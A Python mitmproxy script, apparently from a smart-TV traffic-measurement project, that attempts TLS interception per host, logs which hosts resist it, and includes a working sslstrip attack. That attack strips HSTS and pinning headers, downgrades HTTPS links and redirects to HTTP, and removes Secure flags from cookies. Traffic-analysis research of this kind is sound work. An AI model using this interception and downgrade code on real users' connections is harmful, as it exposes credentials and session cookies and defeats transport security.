import collections
import redis
import time
import re
import os
import urllib.parse
import typing  # noqa
import mitmproxy
import logging
import traceback
from os.path import isfile, join
from datetime import datetime
import threading

from enum import Enum
from mitmproxy import ctx
from mitmproxy.exceptions import TlsProtocolException
from mitmproxy.proxy.protocol import TlsLayer, RawTCPLayer
from mitmproxy import http


UNMITMABLE_HOST_DIR = "/smart-tv-data/roku-unmitmable-hosts/"


class InterceptionResult(Enum):
    success = True
    failure = False
    skipped = None


def append_to_file(file_path, text):
    with open(file_path, 'a') as f:
        f.write(text)

"""

gunes: it is quite difficult parse the existing format
# we switched to flat format instead
EOL = "\n"
def convert_unmitmable(filename, outdir):
    tuples = set()
    for l in open(filename):
        l = l.rstrip()
        if not l:
            continue
        parts = l.split(" ", 2)
        ch_id = parts[1].replace('"', '').strip(":")
        b = json.loads(parts[2])
        assert len(b) == 1
        domain = b.keys()[0]
        ip_port = b.values()[0]
        ip = ip_port.split(" ")[0].split("'")[1]
        # port = ip_port.split(" ")[1].rstrip(")")
        if not ip:
            raise ValueError("convert_unmitmable: No IP address")
        tuples.add((ch_id, ip, domain))
    f_basename = basename(filename)
    with open(join(outdir, f_basename), "w") as f:
        for _tuple in tuples:
            f.write("\t".join(_tuple) + EOL)
"""

def loadUnMitmableHostsAndIps(filename):
    hosts = set()
    ips = set()
    if isfile(filename):
        for line in open(filename):
            line = line.rstrip("\n")
            _, ip, host = line.split("\t")
            if host:
                hosts.add(host)
            if ip:
                ips.add(ip)
    return hosts, ips


class _TlsStrategy:
    """
    Abstract base class for interception strategies.
    """

    def __init__(self, unMitmableFileNameIn):
        # A server_address -> interception results mapping
        self.historyIP = collections.defaultdict(lambda: collections.deque(maxlen=200))
        self.historyDomain = collections.defaultdict(lambda: collections.deque(maxlen=200))
        self.rName2IPDic = redis.StrictRedis(host='localhost', port=6379, db=0, charset="utf-8", decode_responses=True)
        self.rIP2NameDic = redis.StrictRedis(host='localhost', port=6379, db=1, charset="utf-8", decode_responses=True)
        self.unMitmableHosts, self.unMitmableIps = loadUnMitmableHostsAndIps(unMitmableFileNameIn)
        logging.info("Loaded %d unmitmable hosts, %d unmitmable IPs from %s" % (
            len(self.unMitmableHosts), len(self.unMitmableIps), unMitmableFileNameIn))

    def getAssocitatedIPs(self, IPAddress):
        IPList = set([str(IPAddress)])
        hostname = self.rIP2NameDic.get(IPAddress)
        if hostname and hostname in self.rName2IPDic:
            IPList = IPList.union(self.rName2IPDic.smembers(hostname))
        return list(IPList)
    def getAssociatedDomain(self, IPAddress):
        hostname = ""
        IPList = set([str(IPAddress)])
        if IPAddress in self.rIP2NameDic:
            hostname = self.rIP2NameDic.get(IPAddress)
        return hostname


    def should_intercept(self, server_address):
        """
        Returns:
            True, if we should attempt to intercept the connection.
            False, if we want to employ pass-through instead.
        """
        raise NotImplementedError()

    def record_success(self, server_address):
        self.historyIP[server_address].append(InterceptionResult.success)

        hostname = self.getAssociatedDomain(str(server_address[0]))
        if hostname:
            self.historyDomain[hostname].append(InterceptionResult.success)

        append_to_file(mitmableFileName, "%s\t%s\t%s\n" % (str(channel_id), str(server_address[0]), hostname))
        # with open(mitmableFileName, 'a') as the_file:
        #    the_file.write("Channel \"%s\": {\"%s\": \"%s\"} \n" % (str(channel_id), hostname, str(server_address)))

    def record_failure(self, server_address):
        hostname = str(self.getAssociatedDomain(server_address[0]))
        self.historyIP[server_address].append(InterceptionResult.failure)
        if hostname:
            self.historyDomain[hostname].append(InterceptionResult.failure)

        append_to_file(unMitmableFileNameOut, "%s\t%s\t%s\n" % (str(channel_id), str(server_address[0]), hostname))
        # with open(unMitmableFileName, 'a') as the_file:
        #    the_file.write("Channel \"%s\": {\"%s\": \"%s\"} \n" % (str(channel_id), hostname, str(server_address)))
            #the_file.write(str(server_address)+":" + str(tls_strategy.should_intercept(server_address)) +'\n')

    def record_skipped(self, server_address):
        self.historyIP[server_address].append(InterceptionResult.skipped)


class ConservativeStrategy(_TlsStrategy):
    """
    Conservative Interception Strategy - only intercept if there haven't been any failed attempts
    in the history.
    """

    def should_intercept(self, server_address):
        hostname = self.getAssociatedDomain(str(server_address[0]))
        if hostname and InterceptionResult.failure in self.historyDomain[hostname]:
            return False
        if InterceptionResult.failure in self.historyIP[server_address]:
            return False
        if hostname in self.unMitmableHosts:
            return False
        if server_address in self.unMitmableIps:
            return False
        return True



class TlsFeedback(TlsLayer):
    """
    Monkey-patch _establish_tls_with_client to get feedback if TLS could be established
    successfully on the client connection (which may fail due to cert pinning).
    """
    def _establish_tls_with_client(self):
        server_address = self.server_conn.address

        try:
            super(TlsFeedback, self)._establish_tls_with_client()
        except TlsProtocolException as e:
            tls_strategy.record_failure(server_address)
            raise e
        else:
            tls_strategy.record_success(server_address)


# inline script hooks below.

tls_strategy = None


def load(l):
    l.add_option(
        "tlsstrat", int, 0, "TLS passthrough strategy (0-100)",
    )
    l.add_option(
        "channel_id", int, 0, "Channel ID",
    )
    l.add_option(
        "data_dir", str, "", "/tmp/",
    )
    # 0 for False and other values for True
    l.add_option(
        "ssl_strip", int, 1, "Enable SSL Strip option: 0 for False and other values for True",
    )
    '''
    try:
        os.remove(mitmableFileName)
        os.remove(unMitmableFileName)
    except Exception:
        pass
    '''

def my_log(*args):
    global strip_log_file, lock_obj
    s = '[{}] '.format(datetime.today())
    s += ' '.join([str(v) for v in args])

    print(s)
    with lock_obj:
        with open(strip_log_file, 'a') as fp:
            print(s, file=fp)

def configure(updated):
    global tls_strategy, channel_id, data_dir, mitmableFileName, unMitmableFileNameIn, unMitmableFileNameOut,\
        strip_log_file, lock_obj, ssl_strip_en
    #if ctx.options.tlsstrat > 0:
    #    tls_strategy = ProbabilisticStrategy(float(ctx.options.tlsstrat) / 100.0)
    #else:
    #    tls_strategy = ConservativeStrategy()
    try:
        lock_obj = threading.Lock()
        channel_id = ctx.options.channel_id
        data_dir = ctx.options.data_dir
        ssl_strip_en = bool(ctx.options.ssl_strip)

        base_filename = '{}-{}'.format(
            channel_id,
            int(time.time())
        )
        mitmableFileName = os.path.join(str(data_dir), "mitmlog/") + str(base_filename) + '.mitmable'
        unMitmableFileNameIn = join(UNMITMABLE_HOST_DIR, str(channel_id) + '.unmitmable')
        unMitmableFileNameOut = os.path.join(str(data_dir), "mitmlog/") + str(channel_id) + '.unmitmable'
        # unMitmableFileName = str(data_dir) + "/mitmlog/" + str(base_filename) + '.unmitmable'
        tls_strategy = ConservativeStrategy(unMitmableFileNameIn)

        strip_log_dir = os.path.join(str(data_dir), "mitmlog/")
        if not os.path.isdir(strip_log_dir):
            mitmproxy.ctx.log("Error!!! Strip folder %s not found!" % strip_log_dir)
        else:
            strip_log_file = os.path.join(strip_log_dir, (str(base_filename) + '.strip'))
        mitmproxy.ctx.log('Successfully loaded smart tls script!')
        mitmproxy.ctx.log('SSL strip set to %s' % str(ssl_strip_en))
        #os.environ['SSLKEYLOGFILE'] = "~/.mitmproxy/sslkeylogfile.txt"
    except Exception as e:
        mitmproxy.ctx.log('Error loading the smart tls script!')
        traceback.print_exc()


def next_layer(next_layer):
    """
    This hook does the actual magic - if the next layer is planned to be a TLS layer,
    we check if we want to enter pass-through mode instead.
    """
    if isinstance(next_layer, TlsLayer) and next_layer._client_tls:
        server_address = next_layer.server_conn.address
        #cert = next_layer._find_cert())
        hostname = tls_strategy.getAssociatedDomain(server_address[0])
        timestamp = '[{}] '.format(datetime.today())
        if hostname:
            mitmproxy.ctx.log(timestamp + "Deciding TLS strategy for %s mapped to %s " % (str(server_address), hostname))
        else:
            mitmproxy.ctx.log(timestamp + "Deciding TLS strategy for %s " % str(server_address))
        if not tls_strategy:
             mitmproxy.ctx.log("tls_strategy is None for %s" % repr(next_layer.server_conn.address), "info")
             return
        if tls_strategy.should_intercept(server_address):
            # We try to intercept.
            # Monkey-Patch the layer to get feedback from the TLSLayer if interception worked.
            next_layer.__class__ = TlsFeedback
        else:
            # We don't intercept - reply with a pass-through layer and add a "skipped" entry.
            timestamp = '[{}] '.format(datetime.today())
            if hostname:
                mitmproxy.ctx.log(timestamp + "TLS passthrough for %s mapped to %s" % (repr(next_layer.server_conn.address), hostname), "info")
            else:
                mitmproxy.ctx.log(timestamp + "TLS passthrough for %s" % repr(next_layer.server_conn.address), "info")
            next_layer_replacement = RawTCPLayer(next_layer.ctx, ignore=True)
            next_layer.reply.send(next_layer_replacement)
            tls_strategy.record_skipped(server_address)



"""
This script implements an sslstrip-like attack based on mitmproxy.
https://moxie.org/software/sslstrip/
"""


# set of SSL/TLS capable hosts
secure_hosts: typing.Set[str] = set()


def request(flow: http.HTTPFlow) -> None:
    global ssl_strip_en
    if not ssl_strip_en:
        return
    flow.request.headers.pop('If-Modified-Since', None)
    flow.request.headers.pop('Cache-Control', None)
    #mitmproxy.ctx.log(
    #    "Request: %s" % repr(flow.request),
    #    "debug")

    # do not force https redirection
    if flow.request.headers.pop('Upgrade-Insecure-Requests', None):
        my_log(
            "SSLStrip - Removing header Upgrade-Insecure-Requests for %s" % flow.request.url)

    # proxy connections to SSL-enabled hosts
    if flow.request.pretty_host in secure_hosts:
        flow.request.scheme = 'https'
        flow.request.port = 443

        # We need to update the request destination to whatever is specified in the host header:
        # Having no TLS Server Name Indication from the client and just an IP address as request.host
        # in transparent mode, TLS server name certificate validation would fail.
        flow.request.host = flow.request.pretty_host


def response(flow: http.HTTPFlow) -> None:
    global ssl_strip_en
    if not ssl_strip_en:
        return
    #flow.response.headers.pop('Strict-Transport-Security', None)
    #flow.response.headers.pop('Public-Key-Pins', None)
    #mitmproxy.ctx.log(
    #    "Response: %s" % repr(flow.response.content),
    #    "debug")
    request_url = flow.request.url
    if flow.response.headers.pop('Strict-Transport-Security', None):
        my_log(
            "SSLStrip - Removing header Strict-Transport-Security for %s" %
            request_url)
    if flow.response.headers.pop('Public-Key-Pins', None):
        my_log(
            "SSLStrip - Removing header Public-Key-Pins for %s:%s" % (request_url, repr(flow.response.port)))


    # strip links in response body
    if b'https://' in flow.response.content:
        try:
            # extract HTTPS URLs from the response body
            https_urls = re.findall('https://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', repr(flow.response.content))
            for https_url in https_urls:
                if "." not in https_url:  # exclude URLs like https://ssl
                    continue
                my_log(
                    "SSLStrip - Will downgrade to HTTP %s %s" %
                    (https_url, request_url))
        except Exception:
            my_log(
                "Error while extracting HTTPS links %s" % request_url)

    flow.response.content = flow.response.content.replace(b'https://', b'http://')

    # strip meta tag upgrade-insecure-requests in response body
    csp_meta_tag_pattern = b'<meta.*http-equiv=["\']Content-Security-Policy[\'"].*upgrade-insecure-requests.*?>'
    flow.response.content = re.sub(csp_meta_tag_pattern, b'', flow.response.content, flags=re.IGNORECASE)

    # strip links in 'Location' header
    if flow.response.headers.get('Location', '').startswith('https://'):
        location = flow.response.headers['Location']
        hostname = urllib.parse.urlparse(location).hostname
        if hostname:
            secure_hosts.add(hostname)
            my_log(
            "Secure Host added: %s" % hostname)
        my_log("SSLStrip - Will downgrade Location header to HTTP %s %s" % (location, request_url))
        flow.response.headers['Location'] = location.replace('https://', 'http://', 1)


    # strip upgrade-insecure-requests in Content-Security-Policy header
    if re.search('upgrade-insecure-requests', flow.response.headers.get('Content-Security-Policy', ''), flags=re.IGNORECASE):
        my_log(
            "SSLStrip - upgrade-insecure-requests: %s %s" %
            (repr(flow.response.headers.get('Content-Security-Policy', '')),
             request_url))
        csp = flow.response.headers['Content-Security-Policy']
        flow.response.headers['Content-Security-Policy'] = re.sub('upgrade-insecure-requests[;\s]*', '', csp, flags=re.IGNORECASE)
        mitmproxy.ctx.log("Removing upgrade-insecure-requests for %s:%s" % (repr(flow.response.host),repr(flow.response.port)), "warn")

    # strip secure flag from 'Set-Cookie' headers
    cookies = flow.response.headers.get_all('Set-Cookie')
    if cookies:
        for s in cookies:
            if "secure" in s:
                my_log("SSLStrip - Stripping Secure Cookie: %s %s" %
                             (repr(s), request_url))
    cookies = [re.sub(r';\s*secure\s*', '', s) for s in cookies]
    flow.response.headers.set_all('Set-Cookie', cookies)
